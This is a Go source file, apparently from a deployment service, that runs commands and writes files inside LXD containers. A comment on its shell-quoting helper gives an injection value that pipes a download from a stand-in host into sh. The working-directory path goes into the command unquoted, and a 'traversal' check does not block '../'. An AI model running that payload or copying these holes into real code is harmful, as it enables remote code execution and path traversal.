package services

import (
	"context"
	"encoding/base64"
	"fmt"
	"sort"
	"strings"
	"time"

	"github.com/opendeploy/opendeploy/internal/exec"
	"go.uber.org/zap"
)

// getNodeEnvFlags returns lxc exec --env flags that set PATH for Node.js.
func getNodeEnvFlags() []string {
	return []string{
		"--env", "PATH=/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
		"--env", "HOME=/root",
	}
}

// wrapWithNodePath ensures node/npm commands use the correct path
func wrapWithNodePath(fullCmd string) string {
	// Node.js is now installed directly in /usr/local/bin, so PATH is already correct
	return fullCmd
}

// WriteFileInContainer writes content to a file inside the container without
// passing it through a shell. Content is base64-encoded and piped to `base64 -d`,
// so a value containing quotes, newlines, or a heredoc delimiter is inert.
func (l *LXDService) WriteFileInContainer(ctx context.Context, containerID, path, content string) error {
	encoded := base64.StdEncoding.EncodeToString([]byte(content))
	cmd := fmt.Sprintf("base64 -d > %s", shellQuote(path))
	_, err := l.runner.RunWithStdin(ctx, exec.RunOpts{
		JobType: "lxd_write_file",
		Command: "lxc",
		Args:    []string{"exec", containerID, "--", "/bin/sh", "-c", cmd},
		Timeout: 30 * time.Second,
	}, strings.NewReader(encoded))
	return err
}

// ExecOptions holds options for executing commands in containers
type ExecOptions struct {
	WorkDir     string
	Environment map[string]string
	Timeout     time.Duration
}

// shellQuote wraps s in single quotes, escaping any embedded single quotes.
// Without this, a value like `x'; curl evil.sh | sh; y='` would break out of
// the quoting used to build the export statement.
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// RunCommandInContainerWithOptions runs a command inside an LXD container with working directory and environment
func (l *LXDService) RunCommandInContainerWithOptions(ctx context.Context, containerID, command string, opts ExecOptions) (*exec.ExecResult, error) {
	l.logger.Info("running command in container with options",
		zap.String("containerId", containerID),
		zap.String("command", command),
		zap.String("workDir", opts.WorkDir),
	)

	// Build the full command with cd to workdir if specified
	fullCmd := command
	if opts.WorkDir != "" {
		fullCmd = fmt.Sprintf("cd %s && %s", opts.WorkDir, command)
	}

	// Add environment variables if specified
	if len(opts.Environment) > 0 {
		keys := make([]string, 0, len(opts.Environment))
		for k := range opts.Environment {
			keys = append(keys, k)
		}
		sort.Strings(keys) // deterministic command string
		var envPrefix strings.Builder
		for _, k := range keys {
			envPrefix.WriteString(fmt.Sprintf("export %s=%s && ", k, shellQuote(opts.Environment[k])))
		}
		fullCmd = envPrefix.String() + fullCmd
	}

	timeout := opts.Timeout
	if timeout == 0 {
		timeout = 5 * time.Minute
	}

	fullCmd = wrapWithNodePath(fullCmd)

	args := []string{"exec", containerID}
	args = append(args, getNodeEnvFlags()...)
	args = append(args, "--", "/bin/sh", "-c", fullCmd)

	result, err := l.runner.Run(ctx, exec.RunOpts{
		JobType: "lxd_exec",
		Command: "lxc",
		Args:    args,
		Timeout: timeout,
	})

	if err != nil {
		return nil, fmt.Errorf("failed to run command: %w", err)
	}

	return result, nil
}

// ResolveWorkDir resolves the working directory inside the container
func ResolveWorkDir(repoRoot, userSubdir string) string {
	if userSubdir == "" || userSubdir == "." {
		return repoRoot
	}
	// Clean path to prevent traversal
	cleaned := strings.TrimPrefix(userSubdir, "/")
	cleaned = strings.TrimPrefix(cleaned, "./")
	return fmt.Sprintf("%s/%s", repoRoot, cleaned)
}
